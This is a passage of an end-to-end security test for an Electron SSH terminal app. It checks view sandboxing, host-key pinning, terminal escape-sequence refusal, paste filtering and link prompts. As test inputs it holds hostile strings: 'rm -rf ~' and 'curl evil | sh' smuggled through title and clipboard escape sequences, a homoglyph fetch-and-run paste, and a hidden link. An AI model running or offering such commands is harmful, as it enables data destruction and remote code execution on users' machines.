    // The setting only. That a hidden tab keeps its full output rate under load is a lab case (a flood), not this.
    const throttled = [a, b].map((t) => t.view.webContents.getBackgroundThrottling());
    check('tab views are set never to be throttled when hidden', throttled.every((x) => x === false), throttled);

    // What a view cannot do.
    await js(a.view, `location.href = '${web}/go'; 0`);
    await sleep(400);
    check('a view cannot navigate away', a.view.webContents.getURL() === 'app://tab-1/index.html', a.view.webContents.getURL());
    const opened = await js<string>(a.view, `[window.open('${web}/open'), window.open('app://shell/index.html')].map(String).join()`);
    check('a view cannot open a window', opened === 'null,null', opened);
    const reached = await js<string>(a.view, `Promise.all([
      fetch('${web}/fetch').then(() => 'reached', () => 'blocked'),
      new Promise((r) => { const i = new Image(); i.onload = () => r('reached'); i.onerror = () => r('blocked'); i.src = '${web}/x.png'; }),
      fetch('app://tab-2/index.html').then(() => 'reached', () => 'blocked'),
      fetch('app://shell/index.html').then(() => 'reached', () => 'blocked'),
      fetch('file:///etc/hostname').then(() => 'reached', () => 'blocked'),
    ]).then((x) => x.join())`);
    check('a view reaches no network, no other view, no file', reached === 'blocked,blocked,blocked,blocked,blocked', reached);
    const script = await js<string>(a.view, `(() => {
      const s = document.createElement('script'); s.textContent = 'window.__inline = 1'; document.body.append(s);
      let ev = 'ran'; try { eval('1 + 1'); } catch { ev = 'blocked'; }
      return [typeof window.__inline, ev].join();
    })()`);
    check('no inline script, no eval', script === 'undefined,blocked', script);
    const perms = await js<string>(a.view, `Promise.all(['notifications', 'geolocation', 'camera', 'clipboard-read'].map((name) => navigator.permissions.query({ name }).then((p) => p.state, () => 'error'))).then((x) => x.join())`);
    check('every permission is denied', perms === 'denied,denied,denied,denied', perms);

    // Watchdogs show; they never restart. (Signals: not on Windows, where the Windows job has its own way.)
    if (process.platform !== 'win32') {
      const c = ctx.openTab()!;
      await until(() => c.engine.state === 'ready', 10_000);
      const pid = c.engine.pid;
      check('there is an engine to freeze', signal(pid, 'SIGSTOP'), pid);
      const noticed = await until(() => c.engine.state === 'not-answering', 9000);
      check('a frozen engine is shown as not answering', noticed, c.engine.state);
      check('and is neither ended nor replaced', alive(pid) && c.engine.pid === pid, [alive(pid), c.engine.pid === pid]);
      signal(pid, 'SIGCONT');
      check('it is ready again when it answers', await until(() => c.engine.state === 'ready', 5000) && c.engine.pid === pid, c.engine.state);
      await type(a, 'still-a-41f');
      check('other tabs worked throughout', await until(async () => (await shown(a)).includes('still-a-41f'), 3000));
      ctx.closeTab(c.id);
      check('closing a tab ends its engine', await until(() => !alive(pid), 5000), alive(pid));
    }

    // An engine that ends after its tab was closed (it was frozen at that moment) harms nothing.
    if (process.platform !== 'win32') {
      const d = ctx.openTab()!;
      await until(() => d.engine.state === 'ready', 10_000);
      const pid = d.engine.pid;
      signal(pid, 'SIGSTOP');
      ctx.closeTab(d.id);
      await sleep(300);
      signal(pid, 'SIGCONT');
      check('an engine ending after its tab closed harms nothing', await until(() => !alive(pid), 5000) && d.engine.state === 'gone', d.engine.state);
    }

    // A killed engine: shown with its cause, not restarted, and no other tab is touched.
    const bPid = b.engine.pid;
    check('there is an engine to kill', signal(bPid, 'SIGKILL'), bPid);
    check('a killed engine is shown as gone, with why', await until(() => b.engine.state === 'gone' && b.engine.cause !== '', 5000), [b.engine.state, b.engine.cause]);
    await sleep(1500);
    check('it is not restarted', b.engine.state === 'gone' && b.engine.pid === bPid, [b.engine.state, b.engine.pid === bPid]);
    await type(a, 'after-kill-9d0');
    check('the other tab is untouched', await until(async () => (await shown(a)).includes('after-kill-9d0'), 3000) && a.engine.state === 'ready', a.engine.state);
    const seen = ctx.shellState().tabs.map((t) => `${t.id}:${t.state}`).join();
    check('the shell is told each state', seen === '1:ready,2:gone', seen);

    // ---- A box, for real: added, checked, pinned, connected to, signed in by the key process. ----
    // The box is the lab's own SSH server on this machine; the app reaches it the way it reaches any box.
    const labBin = process.env['SSHAPP_LABBOX'] ?? '';
    if (labBin === '') check('a lab box to connect to', false, 'SSHAPP_LABBOX is not set: the box probes need the lab\'s SSH server');
    else {
      const { box: lab, first } = await LabBox.start(labBin);
      const addr = String(first['addr'] ?? '');
      const printed = String(first['printed'] ?? '');
      const port = addr.split(':')[1] ?? '';
      check('the lab box is up', /^127\.0\.0\.1:\d+$/.test(addr) && printed.includes('SHA256:'), first);
      const B = ctx.boxes;
      const view = (id: string) => B.check(id);

      check('a draft with a field to fix is not added, and says which', JSON.stringify(await B.add({ name: 'lab-box', colour: 2, host: '127.0.0.1', port: 'x', user: 'demo', folder: '', places: [] })) === JSON.stringify({ ok: false, error: 'fields', fields: { port: '1 to 65535' } }), '');
      const added = await B.add({ name: 'lab-box', colour: 2, host: '127.0.0.1', port, user: 'demo', folder: '', places: [{ name: 'logs', folder: "/var/log/it's here" }] });
      const id = added.ok ? added.id : '';
      const box = () => B.get(id)!;
      check('a box is added: its key is made by the key process, and it is not pinned', added.ok && box().pin === '' && /^ssh-ed25519 [A-Za-z0-9+/]+=*$/.test(box().publicKey), added);
      const held = await ctx.keys.request('keys');
      check('the key process holds one key for it, bound to that box and user', Array.isArray(held['keys']) && JSON.stringify((held['keys'] as Record<string, unknown>[]).map((k) => [k['name'], k['box'], k['user'], k['publicKey']])) === JSON.stringify([[id, id, 'demo', box().publicKey]]), held);
      check('a box that was never checked cannot be connected to', ctx.openTab(id) === null && ctx.openTab(id, 'logs') === null, '');
      check('the block to run holds the approved text and this box\'s key', B.block(id) === `umask 077; mkdir -p ~/.ssh && echo '${box().publicKey} berth:lab-box' >> ~/.ssh/authorized_keys && for f in /etc/ssh/ssh_host_*_key.pub; do ssh-keygen -lf "$f"; done`, B.block(id));

      // The check. The box is asked who it is; what it showed is told to no view before a paste is compared.
      B.reach(id);
      check('the box is reached, and what it showed is kept back', (await until(() => view(id).step === 'reached', 20_000)) && view(id).shownFingerprint === '' && !JSON.stringify(view(id)).includes('SHA256'), view(id));
      const asked = await lab.tell('seen');
      check('asking who it is tried no sign-in and sent no user name', asked['tries'] === 0 && !asked['users'], asked);
      B.paste(id, '256 SHA256:nB4yE8wQ2oL6cT0vR9mK3jH7gF5dS1aZ8xU4iP6eW2k root@elsewhere (ED25519)\n');
      const mis = view(id);
      const tried = await B.trust(id);
      // The one value the check exists to withhold must not come back on a mismatch either: with it on screen,
      // the field above is one copy away from a match, for a person in a hurry and for a window that has been
      // taken over alike. What was pasted is shown; what answered is named by kind and no more.
      const answered = (printed.match(/SHA256:[A-Za-z0-9+/]{43}/g) ?? []).filter((f) => f.length > 0);
      check('a paste from another box is a mismatch: what was pasted is shown, nothing is pinned', mis.step === 'mismatch' && mis.pasted.length === 1 && !tried.ok && box().pin === '' && ctx.openTab(id) === null, [mis, tried]);
      check('and what the box answered is not in anything a view is told: its kind, never its fingerprint', mis.shownFingerprint === '' && mis.shownType === 'ssh-ed25519' && answered.length > 0 && !answered.some((f) => JSON.stringify(mis).includes(f)), [mis.shownType, mis.shownFingerprint, answered.length]);
      B.paste(id, '256 SHA256:nB4yE8wQ2oL6cT0vR9mK3jH7gF5dS1aZ8xU4iP6eW2k root@elsewhere (ED25519)\n');
      check('pasting the same wrong thing again changes nothing and still pins nothing', view(id).step === 'mismatch' && view(id).shownFingerprint === '' && box().pin === '', view(id));
      B.paste(id, `3072 SHA256:p1Rt7Cz5Hm2Ve8Yq4Lb0Wn6Ks3Df9Gj1Ax7Ue5Io2Tc root@lab (RSA)\n${printed}`);
      check('the box\'s own lines are a match', view(id).step === 'match' && printed.includes(view(id).shownFingerprint), view(id));
      const trusted = await B.trust(id);
      check('only then is it pinned, with the identity that matched', trusted.ok && box().pin.startsWith('ssh-ed25519 ') && printed.includes(box().pinFingerprint) && box().pinnedAt !== '', [trusted, box().pinFingerprint]);

      // The key is not on the box yet: the sign-in fails, said as such, and the key process did sign.
      const early = ctx.openTab(id)!;
      check('before the key is on the box, the sign-in fails and is said as that', (await until(() => early.engine.link.phase === 'ended', 20_000)) && early.engine.link.cause === 'sign-in-failed' && early.engine.link.endedIn === 'signing-in', early.engine.link);
      check('an engine whose link ended is gone, and says so', await until(() => early.engine.state === 'gone' && early.engine.cause === 'the link ended', 5000), [early.engine.state, early.engine.cause]);
      ctx.closeTab(early.id);

      // The block was "run": the box lets this key in. A tab on the place opens a real shell there.
      const let_ = await lab.tell(`accept ${box().publicKey}`);
      check('the key is on the box', typeof let_['accepting'] === 'string', let_);
      const t = ctx.openTab(id, 'logs')!;
      const phases: string[] = [];
      const watching = setInterval(() => {
        if (phases[phases.length - 1] !== t.engine.link.phase) phases.push(t.engine.link.phase);
      }, 2);
      const up = await until(() => t.engine.link.phase === 'up', 20_000);
      clearInterval(watching);
      check('a tab on the box: the link comes up, signed in by the key process', up && t.engine.signAsked >= 1 && t.engine.signRefused === 0 && ctx.signsRefused() === 0, [t.engine.link, phases, t.engine.signAsked, t.engine.signRefused, ctx.signsRefused()]);
      check('what was agreed is the plan\'s', t.engine.link.cipher === 'aes256-gcm@openssh.com' && ['mlkem768x25519-sha256', 'curve25519-sha256'].includes(t.engine.link.keyExchange), t.engine.link);
      check('the tab says which box and place it is on', JSON.stringify(ctx.shellState().tabs.find((x) => x.id === t.id)?.box) === JSON.stringify({ id, name: 'lab-box', colour: 2, place: 'logs', addr, user: 'demo', folder: "/var/log/it's here", pinType: 'ED25519' }), ctx.shellState().tabs);
      await until(async () => (await js<string>(t.view, `document.readyState`)) === 'complete', 10_000);
      // What the box said at sign-in is folded into one line, with the real notice in it lifted onto that
      // line; nothing of it is drawn in the terminal until the line is opened.
      const foldSaid = await until(async () => (await js<string>(t.view, `document.getElementById('signin')?.textContent ?? ''`)) !== '', 5000) ? await js<string>(t.view, `document.getElementById('signin').textContent`) : '';
      check('what the box said at sign-in is one folded line, with its notice lifted onto it, and none of it drawn yet', foldSaid.includes('lab-box said 3 lines at sign-in') && foldSaid.includes('System restart required') && !(await shown(t)).includes('Welcome to the lab box'), [foldSaid, (await shown(t)).slice(0, 80)]);
      // Opened: it is drawn as words on its own lines, each control character as its picture, and the box's
      // shell is given nothing because of it.
      const PIC = (c: number) => String.fromCodePoint(0x2400 + c); // a control character's picture
      await js(t.view, `document.getElementById('signin').click()`);
      await until(async () => (await shown(t)).includes('second line'), 5000);
      await sleep(200);
      const signInText = (await shown(t)).split('\n').slice(0, 2);
      const becauseOfIt = Buffer.from(String((await lab.tell('received'))['hex'] ?? ''), 'hex').toString('latin1');
      check('opened, it is drawn as words, line by line, its control characters as pictures; nothing in it is obeyed or answered', signInText[0] === 'Welcome to the lab box' && signInText[1] === `${PIC(0x1b)}[c${PIC(0x1b)}]52;c;aGlkZGVu${PIC(7)}${PIC(0x1b)}[31msecond line` && becauseOfIt === '', [signInText, JSON.stringify(becauseOfIt)]);
      await type(t, 'typed-into-the-box-5b2');
      check('typed bytes reach the box\'s shell and its output comes back to this tab', await until(async () => (await shown(t)).includes('typed-into-the-box-5b2'), 5000), await shown(t));
      check('another tab saw none of it', !(await shown(a)).includes('typed-into-the-box'), '');
      // The file channel is opened the first time the tab's browser wants it, which is a moment after the tab
      // comes up: the box is given that moment rather than being asked while it is still one session short.
      let seenNow = await lab.tell('seen');
      await until(async () => {
        seenNow = await lab.tell('seen');
        return ((seenNow['sessions'] ?? []) as unknown[]).length >= 2;
      }, 15_000);
      const sessions = (seenNow['sessions'] ?? []) as { Asked?: string[]; Command?: string; Term?: string; Cols?: number; Rows?: number }[];
      // What Berth asks a box for, in full, and nothing beyond it (plan B10). A tab opens two sessions and no
      // more: the terminal, and the file subsystem for its own file browser. The second asks for one thing,
      // "subsystem", and carries no terminal and no command.
      const shell = sessions.find((x) => (x.Asked ?? []).includes('pty-req'));
      const fileSession = sessions.find((x) => JSON.stringify(x.Asked) === '["subsystem"]');
      const last = shell;
      check('the box was asked for a terminal and the place\'s one start command, and nothing else', sessions.length === 2 && JSON.stringify(shell?.Asked?.slice(0, 2)) === '["pty-req","exec"]' && (shell?.Asked ?? []).slice(2).every((x) => x === 'window-change') && shell?.Command === `cd -- '/var/log/it'\\''s here' && exec "$SHELL" -l` && shell?.Term === 'xterm-256color', seenNow);
      check('and its files were asked for on a session of their own, which asks for one thing and no terminal', fileSession !== undefined && fileSession.Term === '' && fileSession.Command === '', fileSession);
      const sizeNow = await js<{ cols: number; rows: number }>(t.view, `window.berthTerm.size()`);
      check(`the box's terminal was opened at this tab's own size, ${sizeNow.cols} x ${sizeNow.rows}, and never told a size twice`, last?.Cols === sizeNow.cols && last?.Rows === sizeNow.rows && sizeNow.cols > 40 && (last?.Asked ?? []).length === 2, [last?.Cols, last?.Rows, sizeNow, last?.Asked]);
      const worn = await dress(t);
      check('the tab\'s page is whole: each of its stylesheets loaded, the terminal\'s typeface too, the terminal\'s own text field out of sight', dressed(worn), worn);
      check('it signed in as the box\'s user', Array.isArray(seenNow['users']) && (seenNow['users'] as string[]).every((u) => u === 'demo'), seenNow['users']);

      // ---- What a box may not do through the terminal (plan B3, B10). The box prints; the app must send back
      // nothing but the written answers, and nothing of the PC may change. The box's shell is told to stay
      // silent meanwhile, so that what it was given is exactly what the terminal sent by itself.
      await lab.tell('quiet on');
      await sleep(150);
      await lab.tell('received');
      const boxPrints = (text: string) => lab.tell(`print ${Buffer.from(text, 'latin1').toString('hex')}`);
      const boxGot = async (): Promise<string> => {
        await sleep(250);
        return Buffer.from(String((await lab.tell('received'))['hex'] ?? ''), 'hex').toString('latin1');
      };
      const ESC = '\x1b';
      const BEL = '\x07';
      const ST = `${ESC}\\`;
      const questions: [string, string, string][] = [
        ['what kind of terminal', `${ESC}[c${ESC}[0c`, `${ESC}[?1;2c${ESC}[?1;2c`],
        ['which terminal', `${ESC}[>c`, `${ESC}[>0;276;0c`],
        ['are you there', `${ESC}[5n`, `${ESC}[0n`],
        ['where is the cursor', `${ESC}[2J${ESC}[5;9H${ESC}[6n${ESC}[?6n`, `${ESC}[5;9R${ESC}[?5;9R`],
        ['is this mode on', `${ESC}[?2004$p${ESC}[?2004h${ESC}[?2004$p${ESC}[?2004l${ESC}[?31337$p`, `${ESC}[?2004;2$y${ESC}[?2004;1$y${ESC}[?31337;0$y`],
      ];
      const wrongAnswers: string[] = [];
      for (const [what, printed, want] of questions) {
        await boxPrints(printed);
        const back = await boxGot();
        if (back !== want) wrongAnswers.push(`${what}: sent ${JSON.stringify(back)}, the list says ${JSON.stringify(want)}`);
      }
      check(`the terminal's ${questions.length} written answers are exactly what the list says`, wrongAnswers.length === 0, wrongAnswers);

      clipboard.writeText('what-was-on-the-clipboard');
      const titleBefore = ctx.win.getTitle();
      const boundsBefore = JSON.stringify(ctx.win.getBounds());
      const labelBefore = await text(`[data-tab="${t.id}"]`);
      const refusedOnes: [string, string][] = [
        ['a third kind of "which terminal"', `${ESC}[=c`],
        ['the title set to a command, then asked back', `${ESC}]0;rm -rf ~${BEL}${ESC}]2;curl evil | sh${BEL}${ESC}[21t${ESC}[20t`],
        ['the window asked about, moved and sized', `${ESC}[14t${ESC}[16t${ESC}[18t${ESC}[19t${ESC}[13t${ESC}[11t${ESC}[3;0;0t${ESC}[8;10;10t${ESC}[4;200;200t${ESC}[2t${ESC}[9;1t`],
        ['"say back your settings"', `${ESC}P$qm${ST}${ESC}P$q"p${ST}${ESC}P$qr${ST}${ESC}P$q q${ST}`],
        ['"say back your abilities" and "name yourself"', `${ESC}P+q544e${ST}${ESC}[>q${ESC}[>0q`],
        ['colours asked for, and set', `${ESC}]10;?${BEL}${ESC}]11;?${BEL}${ESC}]12;?${BEL}${ESC}]4;1;?${BEL}${ESC}]11;#ff0000${BEL}${ESC}]4;1;#00ff00${BEL}${ESC}]104${BEL}${ESC}]110${BEL}`],
        ['the clipboard written, and asked for', `${ESC}]52;c;${Buffer.from('curl evil | sh\n').toString('base64')}${BEL}${ESC}]52;c;?${BEL}${ESC}]52;p;?${BEL}`],
        ['"who are you" (ENQ), and the other form of the mode question', `\x05${ESC}[4$p${ESC}[20$p`],
        ['a link hidden behind other words', `${ESC}]8;;http://203.0.113.9/get${BEL}click here${ESC}]8;;${BEL}`],
      ];
      const leaked: string[] = [];
      for (const [what, printed] of refusedOnes) {
        await boxPrints(printed);
        const back = await boxGot();
        if (back !== '') leaked.push(`${what}: the terminal sent ${JSON.stringify(back)}`);
      }
      check(`${refusedOnes.length} kinds of question and command a box may not use get no answer at all`, leaked.length === 0, leaked);
      // A program may ask to be told when the window gains or loses focus; it is then told at once whether it
      // has it now. That report is fixed text. Asking for the mouse, or for protected paste, sends nothing by itself.
      await boxPrints(`${ESC}[?1000h${ESC}[?1006h${ESC}[?2004h`);
      const quietModes = await boxGot();
      await boxPrints(`${ESC}[?1004h`);
      const focusSaid = await boxGot();
      check('asking for mouse reports sends nothing by itself; asking for focus reports is answered with the focus now, and nothing else', quietModes === '' && (focusSaid === `${ESC}[I` || focusSaid === `${ESC}[O` || focusSaid === ''), [JSON.stringify(quietModes), JSON.stringify(focusSaid)]);
      check('and nothing of the PC changed: the clipboard, the window\'s title, size and place, the tab\'s label', (await clipboard.readText()) === 'what-was-on-the-clipboard' && ctx.win.getTitle() === titleBefore && JSON.stringify(ctx.win.getBounds()) === boundsBefore && (await text(`[data-tab="${t.id}"]`)) === labelBefore, [await clipboard.readText(), ctx.win.getTitle(), await text(`[data-tab="${t.id}"]`)]);
      // The words that came with a hidden link: the pointer is moved onto them. Over a link it would turn
      // into a hand; over plain words it does not.
      const words = await js<{ x: number; y: number; hand: boolean } | null>(t.view, `window.berthTerm.spot('click here')`);
      if (words) t.view.webContents.sendInputEvent({ type: 'mouseMove', x: words.x, y: words.y });
      await sleep(400);
      const over = await js<{ x: number; y: number; hand: boolean } | null>(t.view, `window.berthTerm.spot('click here')`);
      const drawn = await js<{ links: number; shown: boolean; faults: string[] }>(t.view, `({ links: document.querySelectorAll('#term a').length, shown: window.berthTerm.text().includes('click here'), faults: window.berthTerm.policyFaults() })`);
      check('the hidden link is plain words with nothing behind them, also under the pointer; the page\'s own policy was never broken', drawn.links === 0 && drawn.shown && drawn.faults.length === 0 && over !== null && !over.hand, [drawn, over]);
      await boxPrints(`${ESC}[?1004l${ESC}[?1000l${ESC}[?1006l${ESC}[?2004l${ESC}[2J${ESC}[H`);

      // ---- Paste (plan B2.7, B3). The clipboard is read by main, and only for a paste a person made. ----
      // The terminal's own paste is not Berth's: a paste or drop in the page, and a paste command sent to the
      // page, put nothing on the box. Only a key, or a click, that main itself saw does.
      clipboard.writeText('echo this-came-from-the-page');
      t.view.webContents.focus();
      t.view.webContents.paste();
      await js(t.view, `(() => { const el = document.querySelector('#term textarea'); for (const type of ['paste', 'drop']) { const d = new DataTransfer(); d.setData('text/plain', 'echo this-came-from-the-page'); el.dispatchEvent(type === 'paste' ? new ClipboardEvent('paste', { clipboardData: d, bubbles: true, cancelable: true }) : new DragEvent('drop', { dataTransfer: d, bubbles: true, cancelable: true })); } })()`);
      const fromPage = await boxGot();
      check('a paste the page makes itself, and a paste command sent to the page, put nothing on the box', !fromPage.includes('came-from-the-page') && fromPage.replace(/\x16/g, '') === '', JSON.stringify(fromPage));

      // A paste key main saw, on one line with nothing hidden in it: it goes straight to the box, as typed.
      const pasteKey = async (on: Tab, keyCode = 'V', modifiers: ('control' | 'shift')[] = ['control', 'shift']) => {
        on.view.webContents.focus();
        on.view.webContents.sendInputEvent({ type: 'keyDown', keyCode, modifiers });
        on.view.webContents.sendInputEvent({ type: 'keyUp', keyCode, modifiers });
        await sleep(250);
      };
      clipboard.writeText('one-line-paste-7b2');
      await pasteKey(t);
      const oneLine = await boxGot();
      check('a paste key main saw, one line: the text goes to the box, once and exactly', oneLine === 'one-line-paste-7b2', JSON.stringify(oneLine));
      // A second tab on the same box, put behind: a paste key in it reaches nothing, though its box is live
      // and its own view is focused. Nor does one while a dialog of the shell's is over the tab in front.
      const tBehind = ctx.openTab(id, '')!;
      await until(() => tBehind.engine.link.phase === 'up', 20_000);
      await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${t.id} })`);
      await until(() => ctx.shellState().active === t.id, 2000);
      clipboard.writeText('not-from-a-tab-behind');
      await pasteKey(tBehind);
      const behind = await boxGot();
      check('a paste key in a tab that is not in front puts nothing on the box, though its own link is up', behind === '' && tBehind.engine.link.phase === 'up', [JSON.stringify(behind), tBehind.engine.link.phase]);
      await js(ctx.shell, `window.shellPort.cmd({ op: 'overlay', on: true })`);
      clipboard.writeText('not-from-under-a-dialog');
      await pasteKey(t);
      const pasteUnderDialog = await boxGot();
      await js(ctx.shell, `window.shellPort.cmd({ op: 'overlay', on: false })`);
      check('and none while a dialog or menu of the window is over the tab in front', pasteUnderDialog === '', JSON.stringify(pasteUnderDialog));
      ctx.closeTab(tBehind.id);
      await sleep(200);
      await boxGot();

      // More than one line: nothing is sent on the key. It is shown first, on the shell, where no tab draws.
      clipboard.writeText('echo first-line\nsha256sum /srv/x.tar.gz\n');
      await pasteKey(t);
      const beforeShown = await boxGot();
      const shownOk = await until(() => has('#paste'), 3000);
      check('a paste of more than one line is not sent on the key: it is shown first, on the shell', beforeShown === '' && shownOk && (await text('#paste')).includes('2 lines to lab-box') && (await text('#paste')).includes('the last line runs on arrival'), [JSON.stringify(beforeShown), await text('#paste')]);
      const shellAbove = () => { const kids = ctx.win.contentView.children; return kids[kids.length - 1] === ctx.shell; };
      check('and the shell is above the tabs while it is shown', await until(shellAbove, 1000), '');
      await clickOn('#paste-drop');
      const afterDrop = await boxGot();
      check("Don't send: nothing reaches the box, and the window says so", !(await has('#paste')) && afterDrop === '' && (await text('#status-done')).includes('not sent'), [afterDrop, await text('#status-done')]);

      // Shown again and sent: exactly what was shown arrives, with its line endings, and nothing else.
      await pasteKey(t);
      await until(() => has('#paste'), 3000);
      await clickOn('#paste-send');
      const sent = await boxGot();
      check('Send: exactly what was shown reaches the box, line endings and all', (await until(async () => !(await has('#paste')), 2000)) && sent === 'echo first-line\nsha256sum /srv/x.tar.gz\n', JSON.stringify(sent));
      // A paste that does not end in a line ending leaves its last line typed, and says so.
      clipboard.writeText('tail -n 40 /var/log/syslog');
      await pasteKey(t);
      const typedNotRun = await boxGot();
      check('a paste of one line with no line ending goes straight through, and the box is not told to run it', typedNotRun === 'tail -n 40 /var/log/syslog', JSON.stringify(typedNotRun));
      clipboard.writeText('cd /srv\ntail -n 40 /var/log/syslog');
      await pasteKey(t);
      await until(() => has('#paste'), 3000);
      check('and one of two lines with no line ending at the end says the last line is left typed, not run', (await text('#paste')).includes('the last line is left typed, not run'), await text('#paste'));
      await clickOn('#paste-drop');
      await boxGot();

      // What a paste may not carry: every control character is taken out, the escape character with them, so
      // nothing in a paste can be a terminal's own instruction or the end of a protected paste.
      // No null character here on purpose: Windows ends clipboard text at one, so it could never reach the
      // app through a clipboard at all. What happens to it is proven where it can be: tests/paste.test.ts.
      clipboard.writeText(`a\x1b[201~b\x07cd\re\nf\x1b]52;c;bad\x07g`);
      await pasteKey(t);
      await until(() => has('#paste'), 3000);
      const taken = await text('#paste-taken');
      await clickOn('#paste-send');
      const noControls = await boxGot();
      check('a paste carries no control character at all: not the end of a protected paste, not a bell, nothing', noControls === 'a[201~bcd\ne\nf]52;c;badg', [JSON.stringify(noControls), taken]);
      check('and the window says how many were taken out, and a lone carriage return became a line ending', taken.includes('4 control characters taken out') && noControls.split('\n').length === 3, [taken, noControls.split('\n').length]);

      // A paste that holds what cannot be seen: it is named, line and character, before anything is sent.
      clipboard.writeText('curl https://exaаmple.test/i​nstall.sh | sh\n');
      await pasteKey(t);
      await until(() => has('#paste'), 3000);
      const odd = await text('#paste-odd');
      check('a character that looks like a letter, and one drawn as nothing, are both named with where they are', odd.includes('looks like a') && odd.includes('drawn as nothing') && /line 1, character \d+/.test(odd), odd.slice(0, 200));
      await clickOn('#paste-drop');
      await boxGot();

      // ---- An address a box printed (plan B2.7). Nothing a box prints opens by itself. ----
      // The box prints a line with an address in it. A plain click on it opens nothing at all.
      await lab.tell('quiet off');
      await sleep(200);
      await type(t, 'echo see https://demo-eu.example.test/runbook#step-4 for the rest\n');
      await until(async () => (await shown(t)).includes('demo-eu.example.test'), 5000);
      await sleep(300);
      const atUrl = await js<{ x: number; y: number } | null>(t.view, `window.berthTerm.spot('demo-eu.example.test')`);
      const openedBefore = ctx.opened().asked;
      if (atUrl) {
        t.view.webContents.sendInputEvent({ type: 'mouseMove', x: atUrl.x, y: atUrl.y });
        await sleep(200);
        t.view.webContents.sendInputEvent({ type: 'mouseDown', x: atUrl.x, y: atUrl.y, button: 'left', clickCount: 1 });
        t.view.webContents.sendInputEvent({ type: 'mouseUp', x: atUrl.x, y: atUrl.y, button: 'left', clickCount: 1 });
      }
      await sleep(400);
      check('a plain click on an address a box printed opens nothing and asks nothing', !!atUrl && !(await has('#link')) && ctx.opened().asked === openedBefore, [!!atUrl, await has('#link')]);
      // Ctrl+click asks, on the window's own surface, with the host and the whole address.
      if (atUrl) {
        t.view.webContents.sendInputEvent({ type: 'mouseMove', x: atUrl.x, y: atUrl.y, modifiers: ['control'] });
        await sleep(150);
        t.view.webContents.sendInputEvent({ type: 'mouseDown', x: atUrl.x, y: atUrl.y, button: 'left', clickCount: 1, modifiers: ['control'] });
        t.view.webContents.sendInputEvent({ type: 'mouseUp', x: atUrl.x, y: atUrl.y, button: 'left', clickCount: 1, modifiers: ['control'] });
      }
      const linkAsked = await until(() => has('#link'), 3000);
      const linkSaid = await text('#link');
      check('Ctrl+click asks first, on the window\'s own surface, naming the box and showing the host and the whole address', linkAsked && linkSaid.includes('Open demo-eu.example.test in the browser?') && linkSaid.includes('lab-box') && (await text('#link-url')) === 'https://demo-eu.example.test/runbook#step-4' && ctx.opened().asked === openedBefore, [linkSaid.slice(0, 160), await text('#link-url')]);
      await clickOn('#link-drop');
      check("Don't open: nothing is opened, and the window says so", (await until(async () => !(await has('#link')), 2000)) && ctx.opened().asked === openedBefore && (await text('#status-done')).includes('not opened'), [ctx.opened().asked - openedBefore, await text('#status-done')]);

      // Open: exactly the address that was shown is handed over, and nothing else.
      if (atUrl) {
        t.view.webContents.sendInputEvent({ type: 'mouseDown', x: atUrl.x, y: atUrl.y, button: 'left', clickCount: 1, modifiers: ['control'] });
        t.view.webContents.sendInputEvent({ type: 'mouseUp', x: atUrl.x, y: atUrl.y, button: 'left', clickCount: 1, modifiers: ['control'] });
      }
      await until(() => has('#link'), 3000);
      await clickOn('#link-open');
      await sleep(300);
      check('Open: the address handed to the browser is the one that was shown, to the character', ctx.opened().asked === openedBefore + 1 && ctx.opened().url === 'https://demo-eu.example.test/runbook#step-4', ctx.opened());

      // What a box prints that is not an address to open: nothing becomes clickable at all.
      const refusedBefore = ctx.opened().refused;
      await type(t, 'echo file:///etc/shadow javascript:void(0) ftp://x.test/y\n');
      await until(async () => (await shown(t)).includes('javascript:void'), 5000);
      await sleep(300);
      // What the app itself treats as an address to open, asked of the app, row by row.
      const onRow = async (words: string): Promise<string[]> => {
        const where = await js<{ x: number; y: number } | null>(t.view, `window.berthTerm.spot(${JSON.stringify(words)})`);
        if (!where) return ['(not drawn)'];
        const row = await js<number>(t.view, `(() => { const s = document.querySelector('.xterm-screen').getBoundingClientRect(); const t = window.berthTerm.size(); return Math.floor((${where.y} - s.top) / (s.height / t.rows)) + 1; })()`);
        return js<string[]>(t.view, `window.berthTerm.links(${row})`);
      };
      check('a file, a script, or any address of another kind a box prints is not a link at all', JSON.stringify(await onRow('javascript:void')) === '[]', await onRow('javascript:void'));
      check('and the address that is one is the whole address, and only it', JSON.stringify(await onRow('demo-eu.example.test')) === JSON.stringify(['https://demo-eu.example.test/runbook#step-4']), await onRow('demo-eu.example.test'));
      check('nothing was opened or asked by any of it', !(await has('#link')) && ctx.opened().asked === openedBefore + 1 && ctx.opened().refused === refusedBefore, [await has('#link'), ctx.opened()]);
      await lab.tell('quiet on');
      await sleep(150);
      await boxGot();

      // A box that asked to be told where a paste begins gets the markers; one that did not, gets the text.
      await boxPrints(`${ESC}[?2004h`);
      await sleep(400);
      clipboard.writeText('two\nlines\n');
      await pasteKey(t);
      await until(() => has('#paste'), 3000);
      const saidProtected = (await text('#paste')).includes('asked to be told where a paste begins');
      await clickOn('#paste-send');
      const wrapped = await boxGot();
      check('a box that asked to be told where a paste begins is sent the markers around it, and is told so', wrapped === `${ESC}[200~two\nlines\n${ESC}[201~` && saidProtected, [JSON.stringify(wrapped), saidProtected]);
      await boxPrints(`${ESC}[?2004l`);
      await sleep(400);

      // Select to copy: only the tab in front of the window in use may leave text on the clipboard.
      // The window has to be in use before any of this is asked, or every refusal below would be the window
      // being out of use and not the rule each probe is here to prove. Asking for focus is not getting it, so
      // this waits for the window to say it has focus rather than guessing at a length of time.
      const frontTab = ctx.tabs.get(ctx.shellState().active)!;
      ctx.win.focus();
      const inUse = await until(() => ctx.win.isFocused(), 4000);
      clipboard.writeText('untouched');
      await js(a.view, `window.tabPort.copy('from a tab that is not in front')`);
      await sleep(150);
      check('a tab that is not in front cannot put text on the clipboard', inUse && (await clipboard.readText()) === 'untouched', [await clipboard.readText(), inUse]);
      // The tab in front can, and the window says what was copied; not while a dialog or menu is over it; and
      // never more than the limit.
      await js(ctx.shell, `window.shellPort.cmd({ op: 'overlay', on: true })`);
      await js(frontTab.view, `window.tabPort.copy('from under a dialog')`);
      await sleep(150);
      const underDialog = await clipboard.readText();
      await js(ctx.shell, `window.shellPort.cmd({ op: 'overlay', on: false })`);
      const droppedBeforeCopy = ctx.dropped();
      await js(frontTab.view, `window.tabPort.copy('x'.repeat(${COPY_MAX} + 1))`);
      await sleep(400);
      const tooMuch = await clipboard.readText();
      refusedByTheLock++;
